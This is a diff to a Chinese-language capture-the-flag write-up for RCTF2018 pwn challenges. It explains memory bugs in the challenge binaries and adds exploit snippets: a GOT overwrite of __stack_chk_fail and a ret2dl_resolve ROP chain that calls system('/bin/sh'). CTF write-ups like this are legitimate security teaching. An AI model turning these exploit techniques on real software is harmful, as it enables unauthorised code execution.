@@ -1,12 +1,14 @@
+5/24/2018 11:25:55 PM 
+
 # RCTF2018 #
 ## PWN ##
 ### Rnote ###
 ### 1.题目分析 ###
 典型的菜单题目，漏洞点位于delete_note()中，对ptr指针没有进行初始化。因此，该指针保存了之前函数对该栈地址（ebp-x018）赋值过后的值。  
-存在漏洞函数如下所示：
-![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/1.PNG)
+存在漏洞函数如下所示：  
+![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/1.PNG)  
 保护机制如下：  
-![保护机制](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/2.PNG)
+![保护机制](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/Rnote3/picture/2.PNG)  
 ### 2.漏洞利用 ###
 创建堆块如下所示：
 
@@ -17,6 +19,7 @@
 	add_note('b',0x88,payload)
 	add_note('c',0x88,payload)
 	add_note('f',0x88,payload)
+
 #### 2.1 泄露libc地址 ####
 首先通过show\_note()函数对之后想要释放的堆块进行定位，然后调用delete\_note()函数，传入一个当前不存在的title值，此时程序遍历当前note列表，无法找到对应title的note，因此就不会对ptr指针进行更新，默认释放了之前show_note()函数对该栈地址设定的值。并且对note\_list进行清空时，i=32，note\_list[32]=0。 
  
@@ -232,7 +235,7 @@
 ### Rnote4 ###
 #### 1.题目分析 ####
 在edit_note()函数中存在简单粗暴的堆溢出漏洞，关键在于如何利用，程序无任何能泄露地址的地方。  
-存在漏洞点如下图所示
+存在漏洞点如下图所示:  
 ![漏洞点](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/RNote4/picture/1.PNG)  
 保护机制中，No PIE，No RELRO。
 #### 2.漏洞利用 ####
@@ -446,8 +449,68 @@ operand 3: register/imm
 #### 8.syscall ####
 **opcode:0x0c**  
 function: if(v0==1) printf value of a0。  
-程序漏洞点：  
-1.add，sub函数存在数组下标越界  
-![漏洞点1]()  
-2.lw，sw函数存在数组下标越界  
-![漏洞点2]()
+
+
+**程序漏洞点：**  
+1.add，sub函数存在数组下标越界，其中参数a1既可以是一个寄存器也可以是一个立即数。如果是一个立即数，则其大小只要在int范围内均可。  
+![漏洞点1](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/1.PNG)  
+2.lw，sw函数存在数组下标越界，由于程序中比较的方法为有符号数的比较（jle），因此可以采用负数来进行绕过。  
+![漏洞点2](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/3.PNG)  
+3.栈溢出漏洞，可结合前两个漏洞。修改\_\_stack\_chk\_fail的got表为ret地址，然后进行rop（可采用**dl_resolve**和**DynEym**两种方法）。  
+![漏洞点3](https://raw.githubusercontent.com/fade-vivida/CTF/master/RCTF2018/Pwn/simulator/picture/4.PNG)
+#### 2.漏洞利用 ####
+#### 2.1 覆写stack\_chk\_fail的GOT表为RET地址 ####
+**Method 1:**  
+使用sub或and指令
+  
+	# Method 1： use add/sub
+	change_2_text()
+	offset = ((stack_chk_fail_got - register_val) & 0xffffffff )/8-0x20
+	print hex(offset) 
+	code = 'add '+str(offset)+','+str(leave_ret)+','+str(0)
+	input_code(code)
+
+**Method 2:**  
+使用lw和sw指令，在这主要是用sw指令进行覆写。使用lw指令进行信息泄露的原理与其类似。
+
+	# Method 2: use lw/sw
+	change_2_text()
+	code = 'li $t0,' + str(leave_ret)
+	input_code(code)
+	offset = (stack_chk_fail_got - mapp0 - 4)/8 + 0xE0000000
+	print hex(offset)
+	code = 'li $t1,' + str(offset)
+	input_code(code)
+	code = 'sw $t0,$t1'
+	input_code(code)
+	sl('END')
+一个需要注意的点就是在计算offset时，由于必须保证`t1<=0x400`，且mapp0的值是小于stack\_chk\_fail\_got的。
+因此必须是t1的值必须为一个复制，且满足等式要求使其高位被舍去。
+#### 2.2 栈溢出利用 ####
+**Method 1: dl\_2\_resolve**  
+直接使用roputils进行dl\_resolve的构造，唯一需要注意的点就是程序中没有read函数，可使用fgets函数进行代替。但fgets函数的第三个参数为stdin，需要先进行leak。
+
+	# step 2: leak the value of stdin
+	offset = 0x30
+	payload = pwn_rop.retfill(offset)
+	payload += p32(puts_plt) + p32(pop_ret) + p32(stdin_addr)
+	payload += p32(vul_func)
+	sla('comment: ',payload)
+	stdin_addr = u32(rv(4))
+	lg('stdin_addr',stdin_addr)
+
+	# step 3: dl_resolve
+	sl('END')
+	payload = pwn_rop.retfill(offset)
+	payload += pwn_rop.call(fgets_plt, addr_bss, 100, stdin_addr)
+	payload += pwn_rop.dl_resolve_call(addr_bss + 20, addr_bss)
+	sla('comment: ',payload)
+
+	payload = pwn_rop.string('/bin/sh')
+	payload += pwn_rop.fill(20, payload)
+	payload += pwn_rop.dl_resolve_data(addr_bss + 20, 'system')
+	payload += pwn_rop.fill(100, payload)
+	sl(payload)
+
+**Method 2: DynELF**  
+puts函数构造leak，未完待续。。。
